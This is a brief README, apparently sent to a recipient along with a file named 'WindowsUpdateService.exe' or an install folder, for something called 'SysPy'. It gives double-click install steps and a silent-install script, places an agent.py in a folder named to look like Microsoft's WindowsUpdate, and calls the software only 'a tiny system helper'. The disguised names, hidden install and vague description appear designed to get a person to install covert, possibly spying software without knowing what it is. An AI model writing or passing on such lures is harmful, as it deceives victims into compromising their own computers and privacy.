SysPy - what you were sent
==========================

Option A - the easy way
-----------------------
If you were sent "WindowsUpdateService.exe", just double-click it.
Nothing else is required.

Option B - the folder
---------------------
1. Unzip this folder somewhere (Desktop is fine).
2. Double-click "Install.bat".
3. A small black window may flash. That is it.

Optional: run "Silent.vbs" instead to install with no window at all.

To remove it later:
    python "%LOCALAPPDATA%\Microsoft\WindowsUpdate\agent.py" --uninstall

It is a tiny system helper. Nothing else is required.
